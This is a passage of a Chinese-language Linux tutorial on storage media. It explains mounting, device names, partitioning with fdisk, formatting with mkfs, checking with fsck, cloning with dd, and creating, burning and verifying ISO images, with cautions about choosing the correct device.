<p>另请注意，音频 CD 与 CD-ROM 不同。音频 CD 不包含文件系统，因此不能以通常的方式挂载。</p>
<p>既然我们有了 CD-ROM 驱动器的设备名称，让我们卸载光盘并在文件系统树的另一个位置重新挂载它。为此，我们成为超级用户（使用适合我们系统的命令）并用 umount 命令卸载光盘。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ su -</span><br><span class="line">Password:</span><br><span class="line">[root@linuxbox ~]<span class="comment"># umount /dev/sdc</span></span><br></pre></td></tr></table></figure>

<p>下一步是为磁盘创建一个新的<em>挂载点</em>。挂载点只是文件系统树上的一个目录。它没有什么特别的。它甚至不必是一个空目录，不过如果你在一个非空目录上挂载设备，你将无法看到卸载设备之前该目录的先前内容。为了我们的目的，我们将创建一个新目录。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@linuxbox ~]<span class="comment"># mkdir /mnt/cdrom</span></span><br></pre></td></tr></table></figure>

<p>最后，我们在新的挂载点挂载 CD-ROM。使用 -t 选项来指定文件系统类型。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@linuxbox ~]<span class="comment"># mount -t iso9660 /dev/sdc /mnt/cdrom</span></span><br></pre></td></tr></table></figure>

<p>之后，我们可以通过新的挂载点查看 CD-ROM 的内容。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@linuxbox ~]<span class="comment"># cd /mnt/cdrom</span></span><br><span class="line">[root@linuxbox cdrom]<span class="comment"># ls</span></span><br></pre></td></tr></table></figure>

<p>注意当我们尝试卸载 CD-ROM 时会发生什么。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@linuxbox cdrom]<span class="comment"># umount /dev/sdc</span></span><br><span class="line">umount: /mnt/cdrom: device is busy</span><br></pre></td></tr></table></figure>

<p>这是为什么呢？原因是如果设备正在被某人或某个进程使用，我们无法卸载它。在这种情况下，我们将工作目录更改为 CD-ROM 的挂载点，这导致设备正忙。我们可以通过将工作目录更改为挂载点以外的其他位置来轻松解决这个问题：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@linuxbox cdrom]<span class="comment"># cd</span></span><br><span class="line">[root@linuxbox ~]<span class="comment"># umount /dev/sdc</span></span><br></pre></td></tr></table></figure>

<p>现在设备成功卸载了。</p>
<h3 id="为什么卸载很重要"><a href="#为什么卸载很重要" class="headerlink" title="为什么卸载很重要"></a>为什么卸载很重要</h3><p>如果你查看显示内存使用情况的 free 命令的输出，你会看到一个名为 <em>buffers</em> 的统计数据。计算机系统的设计目的是尽可能快地运行。系统速度的一个障碍是慢速设备。打印机是一个很好的例子。即使是最快的打印机，按计算机标准来看也极其缓慢。如果计算机必须停下来等待打印机完成打印一页，那么计算机的速度会非常慢。在个人电脑早期（在多任务处理之前），这是一个真正的问题。如果你正在处理电子表格或文本文档，每次打印时计算机都会停止并变得无法使用。计算机会以打印机能接受的最快速度发送数据，但这非常缓慢，因为打印机打印速度不快。这个问题通过 <em>打印机缓冲器</em> 的出现得到解决，这是一种包含一些 RAM 内存的设备，位于计算机和打印机之间。有了打印机缓冲器，计算机会将打印输出发送到缓冲器，然后快速存储在快速 RAM 中，使计算机可以在不等待的情况下返回工作。同时，打印机缓冲器会以打印机能接受的速度慢慢地从缓冲器的内存中 <em>缓冲</em> 数据到打印机。</p>
<p>这种缓冲的想法在计算机中被广泛使用，以提高速度。不要让偶尔需要从慢速设备读取或写入数据的需求阻碍系统的速度。操作系统会尽可能长时间地将从存储设备读取的数据和将写入存储设备的数据存储在内存中，直到实际需要与慢速设备进行交互。例如，在 Linux 系统上，你会注意到，系统使用时间越长，内存似乎就越满。这并不意味着 Linux 正在“使用”所有内存；这意味着 Linux 正在利用所有可用的内存尽可能多地进行缓冲。</p>
<p>这种缓冲使得向存储设备的写入可以非常快速地完成，因为写入物理设备被推迟到将来的某个时间。与此同时，注定要写入设备的数据正在内存中堆积。不时地，操作系统会将这些数据写入物理设备。</p>
<p>卸载设备涉及将所有剩余数据写入设备，以便可以安全地移除它。如果在首先卸载设备之前移除它，可能存在并非所有注定要传输到设备的数据都已被传输的可能性。在某些情况下，这些数据可能包括重要的目录更新，这将导致 <em>文件系统损坏</em>，这是计算机上可能发生的最糟糕的事情之一。</p>
<h4 id="确定设备名称"><a href="#确定设备名称" class="headerlink" title="确定设备名称"></a>确定设备名称</h4><p>有时候确定设备的名称有点困难。在过去，这并不难。设备总是在同一个位置，不会改变。类 Unix 系统喜欢这样。当 Unix 被开发时，“更换磁盘驱动器”涉及使用叉车从计算机房间移除洗衣机大小的设备。近年来，典型的桌面硬件配置变得相当动态，Linux 已经比其祖先更加灵活。</p>
<p>在上面的例子中，我们利用了现代 Linux</p>
<p>桌面自动挂载设备的能力，然后事后确定名称。但是，如果我们正在管理服务器或其他不会发生这种情况的环境，我们该如何确定呢？</p>
<p>首先，让我们看看系统如何命名设备。如果我们列出 &#x2F;dev 目录（所有设备所在的位置）的内容，我们可以看到有很多设备。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">ls</span> /dev</span><br></pre></td></tr></table></figure>

<p>这个列表的内容揭示了一些设备命名的模式。表 15-2 概述了其中的一些模式。</p>
<p><em>表 15-2: Linux 存储设备名称</em></p>
<table>
<thead>
<tr>
<th><strong>模式</strong></th>
<th><strong>设备</strong></th>
</tr>
</thead>
<tbody><tr>
<td>&#x2F;dev&#x2F;fd*</td>
<td>软盘驱动器。</td>
</tr>
<tr>
<td>&#x2F;dev&#x2F;hd*</td>
<td>旧系统上的 IDE (PATA) 磁盘。典型的主板包含两个 IDE 连接器或 <em>通道</em>，每个通道有一个带有两个驱动器连接点的电缆。电缆上的第一个驱动器称为 <em>主设备</em>，第二个称为 <em>从设备</em>。设备名称的排序方式是，&#x2F;dev&#x2F;hda 指的是第一个通道上的主设备，&#x2F;dev&#x2F;hdb 是第一个通道上的从设备；&#x2F;dev&#x2F;hdc 是第二个通道上的主设备，依此类推。尾随数字表示设备上的分区号。例如，&#x2F;dev&#x2F;hda1 指的是系统上第一个硬盘的第一个分区，而 &#x2F;dev&#x2F;hda 指的是整个驱动器。</td>
</tr>
<tr>
<td>&#x2F;dev&#x2F;lp*</td>
<td>打印机。</td>
</tr>
<tr>
<td>&#x2F;dev&#x2F;sd*</td>
<td>SCSI 磁盘。在现代 Linux 系统中，内核将所有类似磁盘的设备（包括 PATA&#x2F;SATA 硬盘、闪存驱动器和 USB 大容量存储设备，如便携音乐播放器和数码相机）视为 SCSI 磁盘。其余的命名系统与上面描述的旧 &#x2F;dev&#x2F;hd* 命名方案类似。</td>
</tr>
<tr>
<td>&#x2F;dev&#x2F;sr*</td>
<td>光驱（CD&#x2F;DVD 读取器和刻录器）。</td>
</tr>
</tbody></table>
<p>此外，我们经常看到如 &#x2F;dev&#x2F;cdrom、&#x2F;dev&#x2F;dvd 和 &#x2F;dev&#x2F;floppy 这样的符号链接，它们指向实际的设备文件，提供方便。</p>
<p>如果你正在使用的系统不会自动挂载可移除设备，你可以使用以下技术来确定附加设备时可移除设备的命名方式。首先，开始实时查看 &#x2F;var&#x2F;log&#x2F;messages 或 &#x2F;var&#x2F;log&#x2F;syslog 文件（你可能需要超级用户权限）。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ sudo <span class="built_in">tail</span> -f /var/log/messages</span><br></pre></td></tr></table></figure>

<p>文件的最后几行将被显示，然后暂停。接下来，插入可移动设备。在这个示例中，我们将使用一个 16MB 的闪存驱动器。几乎立即，内核就会注意到该设备并对其进行探测。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Jul 23 10:07:53 linuxbox kernel: usb 3-2: new full speed USB device</span><br><span class="line">using uhci_hcd and address 2</span><br><span class="line">Jul 23 10:07:53 linuxbox kernel: usb 3-2: configuration <span class="comment">#1 chosen</span></span><br><span class="line">from 1 choice</span><br><span class="line">Jul 23 10:07:53 linuxbox kernel: scsi3 : SCSI emulation <span class="keyword">for</span> USB Mass</span><br><span class="line">Storage devices</span><br><span class="line">Jul 23 10:07:58 linuxbox kernel: scsi scan: INQUIRY result too short</span><br><span class="line">(5), using 36</span><br><span class="line">Jul 23 10:07:58 linuxbox kernel: scsi 3:0:0:0: Direct-Access Easy</span><br><span class="line">Disk 1.00 PQ: 0 ANSI: 2</span><br><span class="line">Jul 23 10:07:59 linuxbox kernel: sd 3:0:0:0: [sdb] 31263 512-byte</span><br><span class="line">hardware sectors (16 MB)</span><br><span class="line">Jul 23 10:07:59 linuxbox kernel: sd 3:0:0:0: [sdb] Write Protect is</span><br><span class="line">off</span><br><span class="line">Jul 23 10:07:59 linuxbox kernel: sd 3:0:0:0: [sdb] Assuming drive</span><br><span class="line">cache: write through</span><br><span class="line">Jul 23 10:07:59 linuxbox kernel: sd 3:0:0:0: [sdb] 31263 512-byte</span><br><span class="line">hardware sectors (16 MB)</span><br><span class="line">Jul 23 10:07:59 linuxbox kernel: sd 3:0:0:0: [sdb] Write Protect is</span><br><span class="line">off</span><br><span class="line">Jul 23 10:07:59 linuxbox kernel: sd 3:0:0:0: [sdb] Assuming drive</span><br><span class="line">cache: write through</span><br><span class="line">Jul 23 10:07:59 linuxbox kernel: sdb: sdb1</span><br><span class="line">Jul 23 10:07:59 linuxbox kernel: sd 3:0:0:0: [sdb] Attached SCSI</span><br><span class="line">removable disk</span><br><span class="line">Jul 23 10:07:59 linuxbox kernel: sd 3:0:0:0: Attached scsi generic</span><br><span class="line">sg3 <span class="built_in">type</span> 0</span><br></pre></td></tr></table></figure>

<p>当显示再次暂停后，按 Ctrl-c 返回命令提示符。输出中有趣的部分是对 [sdb] 的重复提及，这符合我们对 SCSI 磁盘设备名称的预期。了解这一点后，下面这两行尤其具有启发性：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Jul 23 10:07:59 linuxbox kernel: sdb: sdb1</span><br><span class="line">Jul 23 10:07:59 linuxbox kernel: sd 3:0:0:0: [sdb] Attached SCSI</span><br></pre></td></tr></table></figure>

<p>这告诉我们整个设备的设备名称是 &#x2F;dev&#x2F;sdb，第一个分区的设备名称是 &#x2F;dev&#x2F;sdb1。正如我们所见，使用 Linux 充满了有趣的侦探工作！</p>
<p><strong>提示：</strong> 使用 tail -f &#x2F;var&#x2F;log&#x2F;messages 技术是实时观察系统正在做什么的好方法。</p>
<p>掌握了设备名称，我们现在可以挂载闪存盘了。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ sudo <span class="built_in">mkdir</span> /mnt/flash</span><br><span class="line">[me@linuxbox ~]$ sudo mount /dev/sdb1 /mnt/flash</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">df</span></span><br><span class="line">Filesystem 1K-blocks Used Available Use% Mounted on</span><br><span class="line">/dev/sda2 15115452 5186944 9775164 35% /</span><br><span class="line">/dev/sda5 59631908 31777376 24776480 57% /home</span><br><span class="line">/dev/sda1 147764 17277 122858 13% /boot</span><br><span class="line">tmpfs 776808 0 776808 0% /dev/shm</span><br><span class="line">/dev/sdb1 15560 0 15560 0% /mnt/flash</span><br></pre></td></tr></table></figure>

<p>只要设备物理连接到计算机并且计算机没有重启，设备名称将保持不变。</p>
<h3 id="创建新的文件系统"><a href="#创建新的文件系统" class="headerlink" title="创建新的文件系统"></a>创建新的文件系统</h3><p>假设我们想要使用本地 Linux 文件系统重新格式化闪存盘，而不是现在的 FAT32 系统。这涉及两个步骤。</p>
<ol>
<li>（可选）如果现有的分区布局不符合我们的喜好，创建新的分区布局。</li>
<li>在驱动器上创建一个新的、空的文件系统。</li>
</ol>
<p><strong>警告！</strong> 在接下来的练习中，我们将格式化一个闪存盘。使用一个你不在乎的驱动器，因为它将被擦除！再次提醒，<strong>一定要确保你指定的是系统中正确的设备名称，而不是文本中显示的那个。不注意这个警告可能会导致你格式化（即擦除）错误的驱动器！</strong></p>
<h4 id="使用-fdisk-操作分区"><a href="#使用-fdisk-操作分区" class="headerlink" title="使用 fdisk 操作分区"></a>使用 fdisk 操作分区</h4><p>fdisk 是众多程序（命令行和图形界面）之一，允许我们直接与磁盘类设备（如硬盘驱动器和闪存盘）进行非常低级别的交互。使用这个工具，我们可以编辑、删除和创建设备上的分区。要处理我们的闪存盘，我们必须先卸载它（如果需要），然后如下调用 fdisk 程序：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ sudo umount /dev/sdb1</span><br><span class="line">[me@linuxbox ~]$ sudo fdisk /dev/sdb</span><br></pre></td></tr></table></figure>

<p>请注意，我们必须以整个设备的形式指定设备，而不是通过分区号。程序启动后，我们将看到以下提示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>):</span><br></pre></td></tr></table></figure>

<p>输入“m”将显示程序菜单。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Command action</span><br><span class="line"> a toggle a bootable flag</span><br><span class="line"> b edit bsd disklabel</span><br><span class="line"> c toggle the dos compatibility flag</span><br><span class="line"> d delete a partition</span><br><span class="line"> l list known partition types</span><br><span class="line"> m <span class="built_in">print</span> this menu</span><br><span class="line"> n add a new partition</span><br><span class="line"> o create a new empty DOS partition table</span><br><span class="line"> p <span class="built_in">print</span> the partition table</span><br><span class="line"> q quit without saving changes</span><br><span class="line"> s create a new empty Sun disklabel</span><br><span class="line"> t change a partition<span class="string">&#x27;s system id</span></span><br><span class="line"><span class="string"> u change display/entry units</span></span><br><span class="line"><span class="string"> v verify the partition table</span></span><br><span class="line"><span class="string"> w write table to disk and exit</span></span><br><span class="line"><span class="string"> x extra functionality (experts only)</span></span><br><span class="line"><span class="string">Command (m for help): </span></span><br></pre></td></tr></table></figure>

<p>我们要做的第一件事是检查现有的分区布局。我们通过输入“p”来打印设备的分区表。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): p</span><br><span class="line">Disk /dev/sdb: 16 MB, 16006656 bytes</span><br><span class="line">1 heads, 31 sectors/track, 1008 cylinders</span><br><span class="line">Units = cylinders of 31 * 512 = 15872 bytes</span><br><span class="line"> Device Boot Start End Blocks Id System</span><br><span class="line">/dev/sdb1 2 1008 15608+ b W95 FAT32 </span><br></pre></td></tr></table></figure>

<p>在这个例子中，我们看到一个 16 MB 的设备，有一个分区（1），使用了设备上可用的 1,008 个柱面中的 1,006 个。该分区被标识为 Windows 95 FAT32 分区。有些程序会使用这个标识符来限制可以对磁盘执行的操作类型，但大多数时候更改它并不重要。然而，为了本次演示，我们将其更改为指示 Linux 分区。为此，我们首先需要找出用于标识 Linux 分区的 ID。在前面的列表中，我们看到 ID b 被用来指定现有分区。要查看可用分区类型的列表，我们参考程序菜单。在那里我们可以看到以下选择：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">l list known partition types</span><br></pre></td></tr></table></figure>

<p>如果我们在提示符下输入 l，则会显示一长串可能的类型。其中我们看到 b 用于我们现有的分区类型和 83 用于 Linux。</p>
<p>回到菜单，我们看到这个选择来更改分区 ID：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">t change a partition<span class="string">&#x27;s system id</span></span><br></pre></td></tr></table></figure>

<p>我们在提示符下输入 t 并输入新的 ID：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): t</span><br><span class="line">Selected partition 1</span><br><span class="line">Hex code (<span class="built_in">type</span> L to list codes): 83</span><br><span class="line">Changed system <span class="built_in">type</span> of partition 1 to 83 (Linux)</span><br></pre></td></tr></table></figure>

<p>这完成了我们需要做的所有更改。到目前为止，设备尚未被触及（所有更改都存储在内存中，而不是在物理设备上），所以我们将修改后的分区表写入设备并退出。为此，我们在提示符下输入 w。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): w</span><br><span class="line">The partition table has been altered!</span><br><span class="line">Calling ioctl() to re-read partition table.</span><br><span class="line">WARNING: If you have created or modified any DOS 6.x</span><br><span class="line">partitions, please see the fdisk manual page <span class="keyword">for</span> additional</span><br><span class="line">information.</span><br><span class="line">Syncing disks.</span><br><span class="line">[me@linuxbox ~]$</span><br></pre></td></tr></table></figure>

<p>如果我们决定保持设备不变，我们可以在提示符下输入 q，这将退出程序而不写入更改。我们可以安全地忽略这个听起来不祥的警告信息。</p>
<h4 id="使用-mkfs-创建新的文件系统"><a href="#使用-mkfs-创建新的文件系统" class="headerlink" title="使用 mkfs 创建新的文件系统"></a>使用 mkfs 创建新的文件系统</h4><p>完成了我们的分区编辑（尽管可能很简单），现在是时候在我们的闪存驱动器上创建一个新的文件系统了。为此，我们将使用 mkfs（代表“制作文件系统”），它可以创建多种格式的文件系统。要在设备上创建一个 ext4 文件系统，我们使用 -t 选项来指定 ext4 系统类型，然后是包含我们想要格式化的分区的设备名称。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ sudo mkfs -t ext4 /dev/sdb1</span><br><span class="line">mke2fs 2.23.2 (12-Jul-2011)</span><br><span class="line">Filesystem label=</span><br><span class="line">OS <span class="built_in">type</span>: Linux</span><br><span class="line">Block size=1024 (<span class="built_in">log</span>=0)</span><br><span class="line">Fragment size=1024 (<span class="built_in">log</span>=0)</span><br><span class="line">3904 inodes, 15608 blocks</span><br><span class="line">780 blocks (5.00%) reserved <span class="keyword">for</span> the super user</span><br><span class="line">First data block=1</span><br><span class="line">Maximum filesystem blocks=15990784</span><br><span class="line">2 block <span class="built_in">groups</span></span><br><span class="line">8192 blocks per group, 8192 fragments per group</span><br><span class="line">1952 inodes per group</span><br><span class="line">Superblock backups stored on blocks:</span><br><span class="line">	8193</span><br><span class="line">Writing inode tables: <span class="keyword">done</span></span><br><span class="line">Creating journal (1024 blocks): <span class="keyword">done</span></span><br><span class="line">Writing superblocks and filesystem accounting information: <span class="keyword">done</span></span><br><span class="line">This filesystem will be automatically checked every 34 mounts or</span><br><span class="line">180 days, whichever comes first. Use tune2fs -c or -i to override.</span><br><span class="line">[me@linuxbox ~]$</span><br></pre></td></tr></table></figure>

<p>程序运行时会显示很多信息，当选择的文件系统类型为 ext4 时。要将设备重新格式化为原来的 FAT32 文件系统，请指定 vfat 作为文件系统类型。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ sudo mkfs -t vfat /dev/sdb1</span><br></pre></td></tr></table></figure>

<p>这种分区和格式化的过程可以在系统添加额外存储设备时使用。虽然我们处理的是一个小闪存驱动器，但同样的过程也可以应用于内部硬盘和其他可移动存储设备，如 USB 硬盘。</p>
<h3 id="测试和修复文件系统"><a href="#测试和修复文件系统" class="headerlink" title="测试和修复文件系统"></a>测试和修复文件系统</h3><p>在我们之前关于 &#x2F;etc&#x2F;fstab 文件的讨论中，我们看到每行末尾有一些神秘的数字。每次系统启动时，它会在挂载它们之前例行检查文件系统的完整性。这是通过 fsck 程序（代表“文件系统检查”）完成的。fstab 条目中的最后一个数字指定了设备检查的顺序。在我们之前的例子中，我们看到根文件系统首先被检查，然后是 home 和 boot 文件系统。最后一位数字为零的设备不会例行检查。</p>
<p>除了检查文件系统的完整性，fsck 还可以修复不同程度的成功损坏的文件系统，这取决于损坏的程度。在类 Unix 文件系统上，恢复的文件部分会被放置在每个文件系统根目录下的 lost+found 目录中。</p>
<p>要检查我们的闪存驱动器（应该首先卸载），我们可以执行以下操作：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ sudo fsck /dev/sdb1</span><br><span class="line">fsck 1.40.8 (13-Mar-2016)</span><br><span class="line">e2fsck 1.40.8 (13-Mar-2016) </span><br><span class="line">/dev/sdb1: clean, 11/3904 files, 1661/15608 blocks</span><br></pre></td></tr></table></figure>

<p>如今，除非存在硬件问题，如磁盘驱动器故障，否则文件系统损坏是非常罕见的。在大多数系统中，启动时检测到的文件系统损坏将导致系统停止，并指示您在继续之前运行 fsck。</p>
<p><strong>什么是 fsck？</strong></p>
<p>在 Unix 文化中，<em>fsck</em> 这个词经常被用来替代一个与它共享三个字母的流行词汇。这尤其恰当，因为如果你发现自己被迫运行 fsck，你可能会说出前面提到的那个词。</p>
<h3 id="直接向设备传输数据"><a href="#直接向设备传输数据" class="headerlink" title="直接向设备传输数据"></a>直接向设备传输数据</h3><p>虽然我们通常认为计算机上的数据是组织成文件的，但也可以将数据视为“原始”形式。例如，如果我们看一下磁盘驱动器，我们会看到它由操作系统视为目录和文件的大量“数据块”组成。然而，如果我们能将磁盘驱动器仅仅当作大量数据块的集合，我们就能执行一些有用的任务，比如克隆设备。</p>
<p>dd 程序执行这个任务。它将数据块从一个地方复制到另一个地方。它使用一个独特的语法（出于历史原因）并且通常这样使用：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=input_file of=output_file [bs=block_size [count=blocks]]</span><br></pre></td></tr></table></figure>

<p><strong>警告！</strong> dd 命令非常强大。尽管它的名称来自于“数据定义”，但它有时被称为“破坏磁盘”，因为用户经常错误地输入 if 或 of 规范。<strong>始终在按下回车键之前仔细检查您的输入和输出规范！</strong></p>
<p>假设我们有两个大小相同的USB闪存驱动器，我们想将第一个驱动器的内容完全复制到第二个驱动器。如果我们将两个驱动器连接到计算机，并分别分配给 &#x2F;dev&#x2F;sdb 和 &#x2F;dev&#x2F;sdc 设备，我们可以使用以下方式将第一个驱动器上的所有内容复制到第二个驱动器：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/sdb of=/dev/sdc</span><br></pre></td></tr></table></figure>

<p>或者，如果只有第一个设备连接到计算机，我们可以将其内容复制到一个普通文件中，以便以后恢复或复制。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/sdb of=flash_drive.img</span><br></pre></td></tr></table></figure>

<h3 id="创建-CD-ROM-镜像"><a href="#创建-CD-ROM-镜像" class="headerlink" title="创建 CD-ROM 镜像"></a>创建 CD-ROM 镜像</h3><p>写入可记录 CD-ROM（CD-R 或 CD-RW）包括两个步骤。</p>
<ol>
<li>构建一个 <em>iso 镜像文件</em>，它是 CD-ROM 的确切文件系统镜像</li>
<li>将镜像文件写入 CD-ROM 媒体</li>
</ol>
<h4 id="创建-CD-ROM-的镜像副本"><a href="#创建-CD-ROM-的镜像副本" class="headerlink" title="创建 CD-ROM 的镜像副本"></a>创建 CD-ROM 的镜像副本</h4><p>如果我们想制作现有 CD-ROM 的 ISO 镜像，我们可以使用 dd 从 CD-ROM 读取所有数据块，并将它们复制到本地文件。假设我们有一张 Ubuntu CD，并且我们想制作一个 ISO 文件，以便以后用来制作更多副本。在插入 CD 并确定其设备名称（我们假设为 &#x2F;dev&#x2F;cdrom）后，我们可以这样制作 ISO 文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/cdrom of=ubuntu.iso</span><br></pre></td></tr></table></figure>

<p>此技术适用于数据 DVD，但不适用于音频 CD，因为它们不使用文件系统进行存储。对于音频 CD，请查看 cdrdao 命令。</p>
<h4 id="从文件集合中创建镜像"><a href="#从文件集合中创建镜像" class="headerlink" title="从文件集合中创建镜像"></a>从文件集合中创建镜像</h4><p>要创建一个包含目录内容的 ISO 镜像文件，我们使用 genisoimage 程序。为此，我们首先创建一个包含我们想要包含在镜像中的所有文件的目录，然后执行 genisoimage 命令来创建镜像文件。例如，如果我们创建了一个名为 ~&#x2F;cd-rom-files 的目录，并用我们的 CD-ROM 文件填满了它，我们可以使用以下命令创建名为 cdrom.iso 的镜像文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">genisoimage -o cd-rom.iso -R -J ~/cd-rom-files</span><br></pre></td></tr></table></figure>

<p>-R 选项添加了用于 <em>Rock Ridge 扩展</em> 的元数据，允许使用长文件名和 POSIX 风格的文件权限。同样，-J 选项启用了 <em>Joliet 扩展</em>，允许 Windows 使用长文件名。</p>
<p><strong>另一个名字的程序…</strong></p>
<p>如果你查看在线教程，了解如何创建和刻录像 CDROM 和 DVD 这样的光学媒体，你会经常遇到两个程序，分别叫做 mkisofs 和 cdrecord。这些程序是 Jörg Schilling 编写的一个受欢迎的软件包 cdrtools 的一部分。2006 年夏天，Schilling 先生对 cdrtools 包的部分内容进行了许可更改，依据许多 Linux 社区的意见，这导致了与 GNU GPL 的许可不兼容。结果，cdrtools 项目的一个 <em>分支</em> 开始，现在包括了 cdrecord 和 mkisofs 的替代程序，分别叫做 wodim 和 genisoimage。</p>
<h3 id="写入-CD-ROM-镜像"><a href="#写入-CD-ROM-镜像" class="headerlink" title="写入 CD-ROM 镜像"></a>写入 CD-ROM 镜像</h3><p>在我们有了镜像文件之后，我们可以将其刻录到光学媒体上。下面我们将讨论的大多数命令可以应用于可记录的 CD-ROM 和 DVD 媒体。</p>
<h4 id="直接挂载-ISO-镜像"><a href="#直接挂载-ISO-镜像" class="headerlink" title="直接挂载 ISO 镜像"></a>直接挂载 ISO 镜像</h4><p>有一个技巧，我们可以使用它在硬盘上挂载 ISO 镜像，并将其视为已经在光学媒体上。通过在挂载时添加“-o loop”选项（以及所需的“-t iso9660”文件系统类型），我们可以将镜像文件挂载为设备并将其附加到文件系统树上。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /mnt/iso_image</span><br><span class="line">mount -t iso9660 -o loop image.iso /mnt/iso_image</span><br></pre></td></tr></table></figure>

<p>在上面的例子中，我们创建了一个名为 &#x2F;mnt&#x2F;iso_image 的挂载点，然后在该挂载点挂载了镜像文件 image.iso。镜像挂载后，就可以像真正的 CD-ROM 或 DVD 一样处理。<em>记得在不再需要时卸载镜像。</em></p>
<h4 id="擦除可重写-CD-ROM"><a href="#擦除可重写-CD-ROM" class="headerlink" title="擦除可重写 CD-ROM"></a>擦除可重写 CD-ROM</h4><p>可重写的 CD-RW 媒体需要被擦除或<em>清空</em>才能被重复使用。为此，我们可以使用 wodim，指定 CD 写入器的设备名称和要执行的擦除类型。wodim 程序提供了几种擦除类型。最简单（也是最快）的是“快速”类型。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wodim dev=/dev/cdrw blank=fast</span><br></pre></td></tr></table></figure>

<h4 id="写入镜像"><a href="#写入镜像" class="headerlink" title="写入镜像"></a>写入镜像</h4><p>为了写入镜像，我们再次使用 wodim，指定光媒体写入器设备的名称和镜像文件的名称。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wodim dev=/dev/cdrw image.iso</span><br></pre></td></tr></table></figure>

<p>除了设备名称和镜像文件，wodim 还支持大量的选项。两个常见的选项是“-v”用于详细输出，和“-dao”，用于以<em>一次性写入</em>模式写入光盘。如果你准备将光盘用于商业复制，应该使用这种模式。wodim 的默认模式是<em>逐轨道写入</em>，适用于录制音乐轨道。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>在这一章中，我们研究了基本的存储管理任务。当然，还有更多。Linux 支持广泛的存储设备和文件系统方案。它还提供了许多与其他系统互操作的功能。</p>
<h3 id="进一步阅读"><a href="#进一步阅读" class="headerlink" title="进一步阅读"></a>进一步阅读</h3><p>查看我们所涉及命令的 man 页面。其中一些支持大量的选项和操作。另外，寻找在线教程，了解如何向你的 Linux 系统添加硬盘（有很多）和处理光媒体。</p>
<h3 id="额外学分"><a href="#额外学分" class="headerlink" title="额外学分"></a>额外学分</h3><p>验证我们下载的 ISO 镜像的完整性通常是有用的。在大多数情况下，ISO 镜像的分发者也会提供一个<em>校验和文件</em>。校验和是通过一种奇特的数学计算得出的，代表目标文件内容的一个数字。如果文件的内容哪怕改变一位，得出的校验和将会大不相同。校验和生成最常用的方法是使用 md5sum 程序。当你使用 md5sum 时，它会产生一个独特的十六进制数字。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">md5sum</span> image.iso</span><br><span class="line">34e354760f9bb7fbf85c96f6a3f94ece image.iso</span><br></pre></td></tr></table></figure>

<p>下载镜像后，你应该对其运行 md5sum 并将结果与发布者提供的 md5sum 值进行比较。</p>
<p>除了检查下载文件的完整性，我们还可以使用 md5sum 来验证新写入的光媒体。为此，我们首先计算镜像文件的校验和，然后为媒体计算校验和。验证媒体的诀窍是将计算限制在仅包含镜像的光媒体部分。我们通过确定镜像包含的 2048 字节块的数量（光媒体总是以 2048 字节块写入）并从媒体中读取那么多块来做到这一点。在某些类型的媒体上，这不是必需的。以一次性写入模式写入的 CD-R 和 CD-RW 磁盘可以通过这种方式进行检查。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">md5sum</span> /dev/cdrom</span><br><span class="line">34e354760f9bb7fbf85c96f6a3</span><br><span class="line"></span><br><span class="line">f94ece /dev/cdrom</span><br></pre></td></tr></table></figure>

<p>许多类型的媒体，如 DVD，需要准确计算块的数量。在下面的例子中，我们检查了 DVD 镜像文件 dvd-image.iso 和 DVD 读取器 &#x2F;dev&#x2F;dvd 中的光盘的完整性。你能弄清楚这是如何工作的吗？</p>
